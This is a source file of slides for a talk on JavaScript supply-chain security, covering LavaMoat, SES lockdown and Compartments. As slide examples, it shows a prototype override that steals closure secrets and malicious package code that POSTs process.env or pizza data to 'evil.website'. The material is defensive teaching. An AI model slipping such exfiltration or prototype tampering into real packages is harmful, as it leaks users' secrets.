import React from 'react';
import { Slide, CodePane, Markdown, Heading } from 'spectacle';
import ActionSlide from './action-slide'
import lavamoatConfig from './example-config.json'


// ignore this - to please the linter
function getRandomNumber () {}

const frozenPrimsCodeExamples = [
// `

//   // anyone can modify base functionality
//   Array.prototype.map = () => { /* ... */ }


// `,
`
const secrets = Array(3).fill().map(getRandomNumber)
function checkSecret (guess) {
  return secrets.includes(guess)
}
`,
// -
`
let checkSecret
{
  const secrets = Array(3).fill().map(getRandomNumber)
  checkSecret = (guess) => {
    return secrets.includes(guess)
  }
}

checkSecret(123)
`,
// 1
`
let checkSecret
{
  const secrets = Array(3).fill().map(getRandomNumber)
  let attempts = 0
  checkSecret = (guess) => {
    attempts++
    if (attempts > 3) throw new Error('No more guesses!')
    return secrets.includes(guess)
  }
}

// how to get secret??
checkSecret(123)
checkSecret(42)
checkSecret(19)
`,
// 2
`
let checkSecret
{
  const secrets = Array(3).fill().map(getRandomNumber)
  let attempts = 0
  checkSecret = (guess) => {
    attempts++
    if (attempts > 3) throw new Error('No more guesses!')
    return secrets.includes(guess)
  }
}

// answer: overwrite what "secrets.includes" does
let stolenSecrets
Array.prototype.includes = function () {
  stolenSecrets = this
}
checkSecret()
`,
]

export class FrozenPrimitivesExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={frozenPrimsCodeExamples.length-1}
        >
        <Heading size={5} textColor="secondary">
          everything is mutable
        </Heading>
        <CodePane
          lang="js"
          source={frozenPrimsCodeExamples[slideActionIndex]}
          textSize={26}
        />
      </ActionSlide>
    )
  }
}

export class FrozenPrimitivesFix extends React.Component {
  render () {
    const source = 
`
// SES-shim provides
lockdown()

// prevent modifications to intrinsics
Object.freeze(Object.prototype)
Object.freeze(Array.prototype)
// ...etc
`
    return (
      <Slide>
        <CodePane
          lang="js"
          source={source}
          textSize={40}
        />
      </Slide>
    )
  }
}


export class CompartmentExplainer extends React.Component {
  render () {
    const source = 
`
// this is almost a Compartment,
const vm = require('vm')
vm.runInContext(code, endowments)

// but this is a different Realm, so it suffers
// from "Identity Discontinuity"
Array !== vm.runInContext('Array')
`
    return (
      <Slide>
        <CodePane
          lang="js"
          source={source}
          textSize={26}
        />
      </Slide>
    )
  }
}

const explicitEndowmentsCodeExamples = [
`
const http = require('http')
const { PizzaValidator } from 'pizza-validator'

PizzaValidator.prototype.validate = (pizzaType, pizzaParameters) => {
  if (pizzaType === 'pineapple') {
    // send to evil lair
    fetch('evil.website', {
      method: 'POST',
      body: JSON.stringify(pizzaParameters),
    })
  }
  // validate pizza normally
}
`,
]


export class ExplicitEndowmentsExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsCodeExamples[slideActionIndex]}
          textSize={26}
        />
      </ActionSlide>
    )
  }
}

const explicitEndowmentsFixCodeExamples = [
  // -
`
// block ambient authority with Compartments 
const compartment = new Compartment(endowments)
compartment.evaluate(code)
`,
  // -
`
// expose only explicit endowments to code
const compartment = new Compartment({ fetch, location })
compartment.evaluate(moduleSource)
`,
`
// with statement
const obj = { abc: 1, xyz: 'hello'}

with (obj) {
  abc++
  console.log(xyz)
}
`,
`
// proxy
const obj = new Proxy({}, {
  get: (target, prop) => {
    if (prop === 'abc') return 1
    if (prop === 'xyz') return 'hello'
  },
  has: (target, prop) => {
    return true
  }
})
`,
`
// Compartment shim, simplified
with (this.scopeControllerProxy) {
  // untrusted code goes here
}
`,
`
// Compartment shim, simplified
with (this.scopeTerminator) {
  with (this.compartmentGlobal) {
    // untrusted code goes here
  }
}
`,
`
// Compartment shim, simplified
with (this.scopeTerminator) {
  with (this.compartmentGlobal) {
    (function(){
      "use strict"
      // untrusted code goes here
    })()
  }
}
`,
`
// part of lockdown
Function.prototype.constructor = function () {
  throw new Error('nope')
}

// Compartment shim, simplified
with (this.scopeTerminator) {
  with (this.compartmentGlobal) {
    (function(){
      "use strict"
      // untrusted code goes here
    })()
  }
}
`,
`
// part of lockdown
Function.prototype.constructor = function () {
  throw new Error('nope')
}

// Compartment shim, simplified
with (this.scopeTerminator) {
  with (this.compartmentGlobal) {
    with (this.allowEvalOnce) {
      (function(){
        "use strict"
        eval(code)
      })()
    }
  }
}
`,
`
// block ambient authority with Compartments 
const compartment = new Compartment(endowments)
compartment.evaluate(code)
`,
// vm
`
// this is almost a Compartment,
const vm = require('vm')
vm.runInContext(code, endowments)

// but this is a different Realm, so it suffers
// from "Identity Discontinuity"
Array !== vm.runInContext('Array')
// breaks instanceof!
vm.runInContext('[]') instanceof Array // false
`,
`
// unique globalThis per compartment
compartmentA.globalThis !== compartmentB.globalThis
// common intrinsics
Array === compartment.globalThis.Array
`,
]

export class ExplicitEndowmentsFix extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={explicitEndowmentsFixCodeExamples.length-1}
        >
        <CodePane
          lang="js"
          source={explicitEndowmentsFixCodeExamples[slideActionIndex]}
          textSize={26}
        />
      </ActionSlide>
    )
  }
}

const exampleConfg = `
"browser-pack": {
  "builtin": {
    "fs.readFileSync": true,
    "path.join": true,
    "path.relative": true
  },
  "globals": {
    "__dirname": true,
    "process.cwd": true
  },
  "packages": {
    "JSONStream": true,
    "combine-source-map": true,
    "defined": true,
    "safe-buffer": true,
    "through2": true,
    "umd": true
  }
},
`

export class ConfigExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    // const { slideActionIndex } = this.state
    return (
      <Slide transition={['slide']} bgColor="primary">
        <CodePane
          lang="js"
          // source={JSON.stringify(lavamoatConfig, null, 2)}
          source={exampleConfg}
          textSize={20}
        />
      </Slide>
    )
  }
}

const lavamoatDiagram = 
`
     App              Package: abc            Package: xyz
   +--------------+ +---------------------+ +---------------------+
   |              | |                     | |                     |
   |              | |                     | |                     |
   |   index.js   | |  one.js     two.js  | |  one.js     two.js  |
   |  +--------+  | | +--------+ +-----+  | | +--------+ +-----+  |
   |  |        |  | | |        | |     |  | | |        | |     |  |
   |  |        |  | | |        | |     |  | | |        | |     |  |
   |  |        |  | | |        | |     |  | | |        | |     |  |
   |  +--------+  | | +--------+ +-----+  | | +--------+ +-----+  |
   |   require    | |  require            | | require             |
   +------+-------+ +---+-----------------+ +--+------------------+
          ^             ^                      ^
+--------------------------------------------------------------------+
          |             |                      |
   +------+-------------+----------------------+--+  +------------+
   |                                              |  |            |
   |            LavaMoat kernel                   +->+   policy   |
   |                                              |  |            |
   +----------------------------------------------+  +------------+
`

export class LavamoatDiagramSlide extends React.Component {  
  render () {
    return (
      <Slide transition={['slide']} bgColor="primary">
        <CodePane
          // lang="js"
          source={lavamoatDiagram}
          textSize={20}
        />
      </Slide>  
    )
  }
}


export class LavaMoatIntroSlide extends React.Component {
  render () {
    return (
      <Slide transition={['slide']} bgColor="primary">
        <CodePane
          lang="bash"
          source={`
          # previously
          node index.js
          # once: automatic policy generation
          lavamoat index.js --writeAutoPolicy
          # new
          lavamoat index.js
          `}
          textSize={20}
        />
      </Slide>
    )
  }
}

const ambientAuthorityExamples = [`
// love to format strings
module.exports = function normalizeUnicode (string) {
  // ...
}
`,
`
// send environment variables to evil lair
fetch('evil.website', {
  method: 'POST',
  body: JSON.stringify(process.env),
})

// keep working normally so no one notices
module.exports = function normalizeUnicode (string) {
  // ...
}
`,
]

// export class AmbientAuthorityExample extends React.Component {
//   render () {
//     return (
//       <Slide transition={['slide']} bgColor="secondary">
//         <Heading size={5} textColor="primary">
//           ambient authority
//         </Heading>
//         <CodePane lang="js" source={ambientAuthorityCode} textSize={26} />
//       </Slide>
//     )
//   }
// }

export class AmbientAuthorityExample extends React.Component {
  constructor (props) {
    super(props)
    this.state = {
      slideActionIndex: 0
    }
  }

  render () {
    const { slideActionIndex } = this.state
    return (
      <ActionSlide
        transition={['slide']}
        bgColor="primary"
        onSlideActionIndexChange={(slideActionIndex) => this.setState(() => ({ slideActionIndex }))}
        slideActionMax={ambientAuthorityExamples.length-1}
        >
         <Heading size={5} textColor="secondary">
           ambient authority
         </Heading>
        <CodePane
          lang="js"
          source={ambientAuthorityExamples[slideActionIndex]}
          textSize={26}
        />
      </ActionSlide>
    )
  }
}